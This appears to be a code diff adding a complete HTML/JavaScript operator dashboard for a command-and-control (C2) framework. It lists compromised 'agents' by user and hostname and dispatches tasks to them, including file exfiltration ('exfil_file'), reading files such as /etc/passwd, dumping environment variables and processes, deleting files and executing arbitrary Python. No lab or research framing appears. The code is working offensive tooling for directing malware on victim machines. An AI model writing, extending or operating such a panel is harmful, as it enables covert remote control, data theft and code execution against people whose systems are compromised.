@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>C2 Dashboard</title>
+<style>
+:root {
+    --bg:      #0d1117;
+    --bg2:     #161b22;
+    --bg3:     #21262d;
+    --border:  #30363d;
+    --text:    #c9d1d9;
+    --muted:   #8b949e;
+    --green:   #3fb950;
+    --red:     #f85149;
+    --yellow:  #d29922;
+    --blue:    #58a6ff;
+    --purple:  #bc8cff;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, monospace; height: 100vh; display: flex; flex-direction: column; }
+
+header {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 10px 20px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    flex-shrink: 0;
+}
+header h1 { font-size: 15px; font-weight: 600; }
+#refresh-indicator { font-size: 11px; color: var(--muted); margin-left: auto; }
+
+.layout {
+    display: grid;
+    grid-template-columns: 270px 1fr;
+    flex: 1;
+    overflow: hidden;
+}
+
+/* Sidebar */
+.sidebar {
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    overflow-y: auto;
+    padding: 12px;
+}
+.section-label {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--muted);
+    padding: 0 4px;
+    margin-bottom: 8px;
+}
+.agent-card {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 10px 12px;
+    margin-bottom: 8px;
+    cursor: pointer;
+    transition: border-color 0.15s;
+}
+.agent-card:hover { border-color: var(--blue); }
+.agent-card.selected { border-color: var(--blue); background: #1c2333; }
+.agent-header { display: flex; align-items: center; gap: 8px; margin-bottom: 3px; }
+.clear-btn { margin-left: auto; background: none; border: 1px solid var(--border); color: var(--muted); font-size: 10px; padding: 2px 7px; border-radius: 4px; cursor: pointer; flex-shrink: 0; }
+.clear-btn:hover { border-color: var(--red); color: var(--red); background: none; }
+.dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+.dot.online  { background: var(--green); box-shadow: 0 0 5px var(--green); }
+.dot.offline { background: var(--muted); }
+.agent-id { font-size: 11px; font-family: monospace; color: var(--blue); flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.agent-meta { font-size: 11px; color: var(--muted); }
+
+/* Main panel */
+.main { display: flex; flex-direction: column; overflow: hidden; }
+
+.task-form {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 14px 20px;
+    flex-shrink: 0;
+}
+.task-form .section-label { margin-bottom: 10px; }
+.form-row { display: flex; gap: 10px; flex-wrap: wrap; align-items: flex-end; }
+.form-group { display: flex; flex-direction: column; gap: 4px; }
+.form-group label { font-size: 11px; color: var(--muted); }
+select, input[type=text], textarea {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    border-radius: 6px;
+    padding: 6px 10px;
+    font-size: 13px;
+    font-family: monospace;
+    outline: none;
+}
+select:focus, input[type=text]:focus, textarea:focus { border-color: var(--blue); }
+textarea { resize: vertical; }
+button {
+    background: #1f6feb;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    padding: 7px 18px;
+    font-size: 13px;
+    cursor: pointer;
+    font-family: inherit;
+    transition: background 0.15s;
+    white-space: nowrap;
+}
+button:hover { background: #388bfd; }
+.push-feedback { font-size: 12px; font-family: monospace; margin-top: 8px; min-height: 16px; }
+.push-feedback.ok  { color: var(--green); }
+.push-feedback.err { color: var(--red); }
+
+/* Results */
+.results { flex: 1; overflow-y: auto; padding: 14px 20px; }
+.results-header { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; }
+.results-header .section-label { margin-bottom: 0; }
+.agent-label { font-size: 11px; color: var(--blue); font-family: monospace; }
+.filter-row { display: flex; align-items: center; gap: 6px; margin-left: auto; }
+.filter-row label { font-size: 11px; color: var(--muted); }
+.time-filter { display: flex; gap: 4px; }
+.time-filter button { background: var(--bg3); border: 1px solid var(--border); color: var(--muted); font-size: 11px; padding: 2px 8px; border-radius: 4px; cursor: pointer; }
+.time-filter button:hover { border-color: var(--blue); color: var(--text); background: var(--bg3); }
+.time-filter button.active { border-color: var(--blue); color: var(--blue); background: #1c2333; }
+
+table { width: 100%; border-collapse: collapse; font-size: 12px; }
+th { text-align: left; padding: 6px 10px; color: var(--muted); font-weight: 500; border-bottom: 1px solid var(--border); }
+td { padding: 8px 10px; border-bottom: 1px solid #21262d; font-family: monospace; vertical-align: top; }
+tr:hover td { background: var(--bg3); }
+
+.badge { display: inline-block; padding: 2px 7px; border-radius: 10px; font-size: 11px; font-weight: 600; }
+.badge.queued    { background: #2d333b; color: var(--muted); }
+.badge.delivered { background: #2d3a1e; color: var(--yellow); }
+.badge.completed { background: #1a3626; color: var(--green); }
+.badge.error     { background: #3d1f1f; color: var(--red); }
+
+.result-cell { max-width: 480px; white-space: pre-wrap; word-break: break-all; color: var(--muted); font-size: 11px; }
+.result-body { max-height: 72px; overflow: hidden; }
+.result-body.expanded { max-height: none; overflow: visible; }
+.result-body.is-error { color: var(--red); }
+.expand-btn { display: block; margin-top: 3px; background: none; border: none; color: var(--blue); font-size: 11px; cursor: pointer; padding: 0; font-family: monospace; }
+.expand-btn:hover { color: #fff; background: none; }
+.empty { color: var(--muted); font-size: 13px; text-align: center; padding: 40px; }
+</style>
+</head>
+<body>
+
+<header>
+    <h1>C2 Dashboard</h1>
+    <span id="refresh-indicator">—</span>
+</header>
+
+<div class="layout">
+    <!-- Sidebar: agents -->
+    <div class="sidebar">
+        <div class="section-label">Agents</div>
+        <div id="agent-list"><div class="empty">No agents</div></div>
+    </div>
+
+    <!-- Main: dispatch + results -->
+    <div class="main">
+        <div class="task-form">
+            <div class="section-label">Task Dispatch</div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Agent</label>
+                    <select id="target-agent" style="width:230px">
+                        <option value="">— select agent —</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Task Type</label>
+                    <select id="task-type" onchange="updateArgFields()">
+                        <optgroup label="Filesystem">
+                            <option value="list_directory">list_directory</option>
+                            <option value="read_file">read_file</option>
+                            <option value="sample_file">sample_file</option>
+                            <option value="write_file">write_file</option>
+                            <option value="delete_file">delete_file</option>
+                            <option value="exfil_file">exfil_file</option>
+                        </optgroup>
+                        <optgroup label="Sysinfo">
+                            <option value="get_sysinfo">get_sysinfo</option>
+                            <option value="get_env">get_env</option>
+                            <option value="get_uptime">get_uptime</option>
+                            <option value="get_processes">get_processes</option>
+                        </optgroup>
+                        <optgroup label="Execution">
+                            <option value="python_exec">python_exec</option>
+                        </optgroup>
+                    </select>
+                </div>
+                <div id="arg-fields" style="display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end"></div>
+                <button onclick="pushTask()" style="align-self:flex-end">Push Task</button>
+            </div>
+            <div id="push-feedback" class="push-feedback"></div>
+        </div>
+
+        <div class="results">
+            <div class="results-header">
+                <div class="section-label">Task Queue</div>
+                <span id="agent-label" class="agent-label"></span>
+                <div class="filter-row">
+                    <label>Time:</label>
+                    <div class="time-filter">
+                        <button class="active" onclick="setFilter(0,this)">All</button>
+                        <button onclick="setFilter(5,this)">5m</button>
+                        <button onclick="setFilter(15,this)">15m</button>
+                        <button onclick="setFilter(60,this)">1h</button>
+                        <button onclick="setFilter(1440,this)">24h</button>
+                    </div>
+                </div>
+            </div>
+            <div id="task-results"><div class="empty">Select an agent to view tasks</div></div>
+        </div>
+    </div>
+</div>
+
+<script>
+// ── Auth ─────────────────────────────────────────────────────────────────────
+const token = sessionStorage.getItem('c2_token');
+if (!token) { window.location.href = '/login'; }
+
+function authHeaders() {
+    return { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token };
+}
+
+function handleUnauth(r) {
+    if (r.status === 401) { sessionStorage.removeItem('c2_token'); window.location.href = '/login'; }
+}
+
+// ── State ────────────────────────────────────────────────────────────────────
+let selectedAgent  = null;
+let knownAgents    = {};
+let filterMinutes  = 0;   // 0 = all
+
+// ── Arg definitions per task type ────────────────────────────────────────────
+const TASK_DEFS = {
+    list_directory: [{name:'path',  placeholder:'/tmp',             width:'200px'}],
+    read_file:      [{name:'path',  placeholder:'/etc/hostname',     width:'230px'}],
+    sample_file:    [{name:'path',  placeholder:'/etc/passwd',       width:'230px'}],
+    write_file:     [{name:'path',  placeholder:'/tmp/out.txt',      width:'200px'},
+                     {name:'content', placeholder:'file content',    width:'220px', multi:true}],
+    delete_file:    [{name:'path',  placeholder:'/tmp/out.txt',      width:'230px'}],
+    exfil_file:     [{name:'path',  placeholder:'/path/to/file',     width:'250px'}],
+    get_sysinfo:    [],
+    get_env:        [],
+    get_uptime:     [],
+    get_processes:  [],
+    python_exec:    [{name:'code',  placeholder:'print("hello")',    width:'320px', multi:true}],
+};
+
+function updateArgFields() {
+    const type    = document.getElementById('task-type').value;
+    const wrapper = document.getElementById('arg-fields');
+    wrapper.innerHTML = '';
+    (TASK_DEFS[type] || []).forEach(def => {
+        const g = document.createElement('div');
+        g.className = 'form-group';
+        const lbl = document.createElement('label');
+        lbl.textContent = def.name;
+        let el;
+        if (def.multi) {
+            el = document.createElement('textarea');
+            el.rows = 2;
+        } else {
+            el = document.createElement('input');
+            el.type = 'text';
+        }
+        el.placeholder  = def.placeholder;
+        el.style.width  = def.width;
+        el.dataset.arg  = def.name;
+        g.appendChild(lbl);
+        g.appendChild(el);
+        wrapper.appendChild(g);
+    });
+}
+
+function collectArgs() {
+    const args = {};
+    document.querySelectorAll('#arg-fields [data-arg]').forEach(el => {
+        args[el.dataset.arg] = el.value;
+    });
+    return args;
+}
+
+// ── Agents ───────────────────────────────────────────────────────────────────
+async function fetchAgents() {
+    try {
+        const r  = await fetch('/api/agents', { headers: authHeaders() });
+        handleUnauth(r);
+        knownAgents = await r.json();
+        renderAgentList();
+        syncAgentDropdown();
+        document.getElementById('refresh-indicator').textContent =
+            'refreshed ' + new Date().toLocaleTimeString();
+        // auto-select first agent on initial load
+        if (!selectedAgent) {
+            const ids = Object.keys(knownAgents);
+            if (ids.length) selectAgent(ids[0]);
+        }
+    } catch {
+        document.getElementById('refresh-indicator').textContent = 'connection error';
+    }
+}
+
+function renderAgentList() {
+    const el  = document.getElementById('agent-list');
+    const ids = Object.keys(knownAgents);
+    if (!ids.length) { el.innerHTML = '<div class="empty">No agents registered</div>'; return; }
+    el.innerHTML = ids.map(id => {
+        const m      = knownAgents[id];
+        const online = m.status === 'online';
+        const sel    = id === selectedAgent ? ' selected' : '';
+        return `<div class="agent-card${sel}" onclick="selectAgent('${esc(id)}')">
+            <div class="agent-header">
+                <div class="dot ${online ? 'online' : 'offline'}"></div>
+                <span class="agent-id">${esc(id)}</span>
+                <button class="clear-btn" onclick="clearAgent(event,'${esc(id)}')">clear</button>
+            </div>
+            <div class="agent-meta">${esc(m.user || '?')}@${esc(m.hostname || '?')} &nbsp;·&nbsp; ${esc(m.os || '?')} &nbsp;·&nbsp; <span style="color:${online?'var(--green)':'var(--muted)'}">${esc(m.status)}</span></div>
+        </div>`;
+    }).join('');
+}
+
+function syncAgentDropdown() {
+    const sel     = document.getElementById('target-agent');
+    const current = sel.value;
+    const ids     = Object.keys(knownAgents);
+    sel.innerHTML = '<option value="">— select agent —</option>';
+    ids.forEach(id => {
+        const m   = knownAgents[id];
+        const opt = document.createElement('option');
+        opt.value       = id;
+        opt.textContent = `${id.substring(0,8)}…  ${m.user || ''}@${m.hostname || ''}`;
+        sel.appendChild(opt);
+    });
+    if (current && ids.includes(current)) sel.value = current;
+}
+
+function selectAgent(id) {
+    selectedAgent = id;
+    document.getElementById('target-agent').value = id;
+    document.getElementById('agent-label').textContent = id;
+    renderAgentList();
+    fetchTasks(id);
+}
+
+async function clearAgent(event, id) {
+    event.stopPropagation();
+    const cr = await fetch('/api/tasks?agent_id=' + encodeURIComponent(id), { method: 'DELETE', headers: authHeaders() });
+    handleUnauth(cr);
+    if (selectedAgent === id) {
+        document.getElementById('task-results').innerHTML =
+            '<div class="empty">No tasks queued for this agent</div>';
+    }
+}
+
+function setFilter(minutes, btn) {
+    filterMinutes = minutes;
+    document.querySelectorAll('.time-filter button').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    if (selectedAgent) fetchTasks(selectedAgent);
+}
+
+// ── Tasks ────────────────────────────────────────────────────────────────────
+async function fetchTasks(agentId) {
+    if (!agentId) return;
+    try {
+        const r    = await fetch('/api/tasks?agent_id=' + encodeURIComponent(agentId), { headers: authHeaders() });
+        handleUnauth(r);
+        const list = await r.json();
+        renderTasks(list);
+    } catch {
+        document.getElementById('task-results').innerHTML =
+            '<div class="empty">Failed to load tasks</div>';
+    }
+}
+
+function renderTasks(list) {
+    const el = document.getElementById('task-results');
+    if (filterMinutes > 0) {
+        const cutoff = (Date.now() / 1000) - (filterMinutes * 60);
+        list = list.filter(t => (t.created_at || 0) >= cutoff);
+    }
+    if (!list.length) { el.innerHTML = '<div class="empty">No tasks in this time range</div>'; return; }
+    const rows = [...list].reverse().map((t, i) => {
+        const obj    = safeParseJSON(t.task);
+        const type   = obj.type || '?';
+        const ts     = t.created_at ? new Date(t.created_at * 1000).toLocaleTimeString() : '—';
+        const isErr  = !!(t.result && t.result.status === 'error');
+        const status = isErr ? 'error' : t.status;
+        const bodyId = `rb-${i}`;
+        let text;
+        if (!t.result) {
+            text = '—';
+        } else if (isErr) {
+            text = 'Error: ' + (t.result.message || 'unknown error');
+        } else {
+            text = JSON.stringify(t.result, null, 2);
+        }
+        const bodyCls = 'result-body' + (isErr ? ' is-error' : '');
+        return `<tr>
+            <td style="color:var(--muted);white-space:nowrap">${ts}</td>
+            <td style="color:var(--purple)">${esc(type)}</td>
+            <td><span class="badge ${esc(status)}">${esc(status)}</span></td>
+            <td class="result-cell">
+                <div class="${bodyCls}" id="${bodyId}">${esc(text)}</div>
+                <button class="expand-btn" id="btn-${i}" onclick="toggleExpand('${bodyId}','btn-${i}')">▼ expand</button>
+            </td>
+        </tr>`;
+    }).join('');
+    el.innerHTML = `<table>
+        <thead><tr><th>Time</th><th>Type</th><th>Status</th><th>Result</th></tr></thead>
+        <tbody>${rows}</tbody>
+    </table>`;
+    // after render: hide expand button for rows that fit without clipping
+    requestAnimationFrame(() => {
+        document.querySelectorAll('.result-body').forEach(rb => {
+            if (rb.scrollHeight <= rb.clientHeight + 2) {
+                const btn = rb.nextElementSibling;
+                if (btn) btn.style.display = 'none';
+            }
+        });
+    });
+}
+
+function toggleExpand(rbId, btnId) {
+    const rb  = document.getElementById(rbId);
+    const btn = document.getElementById(btnId);
+    const expanded = rb.classList.toggle('expanded');
+    btn.textContent = expanded ? '▲ collapse' : '▼ expand';
+}
+
+// ── Push Task ────────────────────────────────────────────────────────────────
+async function pushTask() {
+    const agentId  = document.getElementById('target-agent').value;
+    const taskType = document.getElementById('task-type').value;
+    const feedback = document.getElementById('push-feedback');
+
+    if (!agentId) {
+        feedback.textContent = 'Select an agent first.';
+        feedback.className   = 'push-feedback err';
+        return;
+    }
+
+    const taskObj = { type: taskType, args: collectArgs(), task_id: crypto.randomUUID() };
+    try {
+        const r    = await fetch('/api/push', {
+            method:  'POST',
+            headers: authHeaders(),
+            body:    JSON.stringify({ id: agentId, task: JSON.stringify(taskObj) }),
+        });
+        const data = await r.json();
+        handleUnauth(r);
+        if (r.ok) {
+            feedback.textContent = `Queued  ${taskObj.task_id}`;
+            feedback.className   = 'push-feedback ok';
+            if (!selectedAgent) selectAgent(agentId);
+            setTimeout(() => fetchTasks(agentId), 400);
+        } else {
+            feedback.textContent = 'Error: ' + (data.error || r.statusText);
+            feedback.className   = 'push-feedback err';
+        }
+    } catch (e) {
+        feedback.textContent = 'Network error: ' + e.message;
+        feedback.className   = 'push-feedback err';
+    }
+}
+
+// ── Helpers ──────────────────────────────────────────────────────────────────
+function safeParseJSON(s) { try { return JSON.parse(s); } catch { return {}; } }
+function esc(s) {
+    return String(s)
+        .replace(/&/g,'&amp;')
+        .replace(/</g,'&lt;')
+        .replace(/>/g,'&gt;')
+        .replace(/"/g,'&quot;');
+}
+
+// ── Init ─────────────────────────────────────────────────────────────────────
+updateArgFields();
+fetchAgents();
+setInterval(fetchAgents, 5000);
+setInterval(() => { if (selectedAgent) fetchTasks(selectedAgent); }, 5000);
+</script>
+</body>
+</html>
